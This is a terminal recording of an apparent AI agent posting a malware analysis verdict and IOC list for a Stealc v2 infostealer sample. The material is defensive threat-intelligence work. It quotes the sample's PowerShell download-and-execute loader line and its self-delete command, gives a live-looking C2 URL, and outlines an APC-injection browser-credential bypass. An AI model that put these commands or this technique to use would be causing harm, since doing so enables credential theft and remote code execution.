[0.017, "o", "\u001b[4;1H\u001b[36m\u001b[1m## Remains\u001b(B\u001b[m                                                                                                                                          \r\n                \r\n\u001b[97mNothing for this question. Optional polish for others: FUN_14003ae80 (Restart-Manager unlock helper) was characterized from its Rm* pointer usage but\r\nnot fully decompiled; it does not affect the C2 picture.\u001b[9;1H\u001b[93m📌 #final-verdict — FINAL VERDICT: Stealc v2 infostealer, x64 MSVC build, C2 http://45.93.20.28/3d15e67552d448ff.php\u001b[36m\u001b[1m main\r\n\u001b(B\u001b[m\u001b[93mConsolidated conclusion of all solved questions:\r\n\u001b[39m                                                                    \r\n\u001b[93m\u001b[1mClassification:\u001b(B\u001b[m\u001b[93m Information stealer with loader capability —\u001b[1m Stealc v2\u001b(B\u001b[m\u001b[93m (MaaS, Vidar/Arkei lineage). Confirmed by 3 YARA family rules (#file-level),\u001b[39m  \r\n\u001b[93mthe v2-specific base64+RC4 string scheme (#q-strin\u001b(B\u001b[m"]
[0.001, "o", "\u001b[93mg-decryption), the JSON/base64 C2 protocol with builder path C:\\builder_v2\\stealc\\json.h\u001b[39m     \r\n\u001b[93m(#q-c2-protocol), the embedded Chrome ABE-bypass helper DLL (#q-embedded-\u001b[Ce), and CIS locale kill-switch (#q-anti-analysis). NOT ransomware\r\n(#q-ransomware refuted the T1486 detector flags).\u001b[39m                                                                                                    \r\n                                                                                                                                                \r\n\u001b[93m\u001b[1mToolchain:\u001b(B\u001b[m\u001b[93m MSVC C++ (VS2022 v17.13, linker 14.43.34809, LTCG), statically linked CRT, PE32+ GUI subsystem, built 2025-04-02 (#q-toolchain-packing).\r\n\u001b[1mNot packed\u001b(B\u001b[m\u001b[93m; obfuscation = per-string base64(RC4(key=\"CgeOvEO7hu\")) + runtime API resolution by decrypted name (no hashing).\r\n\u001b[39m                                                                               \r\n\u001b[93m\u001b[1mCapabilit\u001b(B\u001b[m"]
[0.000, "o", "\u001b[93m\u001b[1mies (#q-capabilities):\u001b(B\u001b[m\u001b[93m Chromium cred/cookie theft incl. v20 app-bound-key bypass via Early-Bird APC injection of embedded IElevator helper\r\nDLL; Firefox NSS decryption; server-configured wallet/extension/file grabber; built-in Steam module; system profiling (HWID, process list, installed\r\napps, multi-monitor JPEG screenshot); loader (EXE/PowerShell-IEX/MSI, optional runas); self-delete (cmd /c timeout /t 5 & del /f /q).\r\n\u001b[39m                                                                                                                                                     \r\n\u001b[93m\u001b[1mC2 (#q-c2-protocol, #q-c2-residuals):\u001b(B\u001b[m\u001b[93m cleartext HTTP POST, port 80, empty User-Agent, body = base64(JSON); flow\u001b[39m                                \r\n\u001b[93mcreate-beacon(hwid,build)→config→chunked upload_file exfil→loader tasks→done. Single endpoint; WinHttp strings are vestigial.\u001b[27;1H\u001b[1mPersistence:\u001b(B\u001b[m\u001b[93m none (#q-persistence).\u001b[1m Anti-analysis (#q-anti-analysis):\u001b(B\u001b[m"]
[0.000, "o", "\u001b[93m CIS LANGID exit, named-event single-instance guard, date kill-switch\r\n11/04/2025; no anti-VM/anti-debug beyond CRT.\r\n\u001b[39m                                                                                                                                                     \r\n\u001b[93mSee #final-iocs for the IOC list.\u001b[39m                       \u001b[32;90H           \u001b[C            \u001b[36m\u001b[1m⠧ \u001b(B\u001b[m\u001b[90mThinking…\u001b[39m \u001b[35m\u001b[1mmain\u001b(B\u001b[m\u001b[37m: calling create_post\u001b(B\u001b[m\u001b[34;2H"]
[0.079, "o", "\u001b[4;1H\u001b[93m📌 #final-iocs — Consolidated IOC list for this Stealc v2 sample\u001b[36m\u001b[1m main\r\n\u001b[93mHashes (#file-identity):\u001b(B\u001b[m\u001b[93m SHA256 3caaaa1451f4ef6a6af13c99a0e4f1704e5337e8a7557b6d45ab82ff691583c4, MD5 e9d335e355f3dcc2196039cc8d79522b; embedded\r\nABE-helper DLL blob SHA256 55494e74…5c3b8f (carved, 0x25600 bytes @ file 0x890d0).\u001b[39m                                                                   \r\n                                                        \r\n\u001b[93m\u001b[1mNetwork:\u001b(B\u001b[m\u001b[93m C2 http://45.93.20.28/3d15e67552d448ff.php (POST, port 80,\u001b[1m empty User-Agent\u001b(B\u001b[m\u001b[93m, Content-Type: application/json, body = base64(JSON)). JSON\r\ntypes: create, upload_file (part_index/total_part\u001b[C, base64 filename), \u001b[Coader, done; fields hwid (GUID-format LCG of volume serial), build,\r\naccess_tok\u001b[Cn. No other endpoint\u001b[C (\u001b[2Crifi\u001b[Cd over all 270 decrypted strings, #q-bulk-strings).\u001b[12;2H\u001b[1mampa\u001b[Cgn/bu\u001b[Cld ID:\u001b(B\u001b[m\u001b[93m 512e7\u001b(B\u001b[m"]
[0.001, "o", "\u001b[93mbd984984fb6\u001b[C(plaintext @ DAT_1400b05f0).\u001b[39m                                                                                   \r\n                                                                                                                                          \r\n\u001b[93m\u001b[1mCrypto:\u001b(B\u001b[m\u001b[93m RC4 string k\u001b[Cy Cg\u001b[COvEO7hu @ 0x14007d6e0;\u001b[Cscheme\u001b[Cbase64→RC4 for all embed\u001b[Ced strings.\u001b[39m                                               \r\n                                                 \r\n\u001b[93m\u001b[1mHost artifacts:\r\n\u001b(B\u001b[m                                                                                                                                                   \r\n\u001b[93m- Named event (single-instance guard): <%p>_<\u001b[ComputerName>_<UserName> (po\u001b[Cnter value formatted\u001b[Cat \u001b[Cun\u001b[Cime — pattern, not fixed string).\r\n- Staging dir C:\\ProgramData\\<random> for locked-file exfil copie\u001b(B\u001b[m"]
[0.000, "o", "\u001b[93ms; exfil filenames passwords.txt, screenshot.jpg.\r\n- Self-delete: cmd.exe /c timeout /t 5 &\u001b[Cdel \u001b[Cf /q \"<own path>\"\u001b[C\u001b[39m                                                                                   \r\n\u001b[93m- \u001b[Coade\u001b[C: powershell.exe -\u001b[Cop -c iex(New-Obj\u001b[Cct Net.WebClient).DownloadString('<URL from C2>') (SysWOW64 path), ms\u001b[Cexec /i …\u001b[C/passive,\u001b[39m              \r\n\u001b[93mShellExecuteExA runas.\u001b[39m                                                                                                               \r\n\u001b[93m- Steam theft masks: ssfn*,config.vdf,DialogConfig.vdf,DialogConfigOverlay*.vdf,libraryfolders.vdf,loginusers.vdf under HKCU\\Software\\Valve\\Steam →\r\nSteamPath.\u001b[39m                                                                                                     \r\n                                                                                                             "]
[0.000, "o", "                \r\n\u001b[93m\u001b[1mBehavioral:\u001b(B\u001b[m\u001b[93m exits on LANGIDs 0x419/0x422/0x423/0x43F/0x443 (RU/UA/BY/KZ/UZ); date kill-switch — payload skipped after\u001b[1m 11 April 2025\u001b(B\u001b[m\u001b[93m; Early-Bird APC\r\ninjection (Creat\u001b[CProcess \u001b[Cu\u001b[Cp\u001b[2Cd\u001b[Cd → VirtualAllocEx RWX 0x25600 → WriteProcessMemory →\u001b[CQueueUserAPC) of brow\u001b[Cer process; IElevator COM (CLSID\r\n{708860E0-…}) for app-bound k\u001b[Cy decr\u001b[Cption; volume-serial-derived named pipe between host and helper DLL.\u001b[30;1H\u001b[1mDistinctive strings:\u001b(B\u001b[m\u001b[93m C:\\builder_v2\\stealc\\json.h, typo Error dumping proccess list, report lines \\t\\t\\tDevice Name: , \\t- Running Path: .\u001b[32;114H\u001b[36m\u001b[1m⠇\u001b(B\u001b[m"]
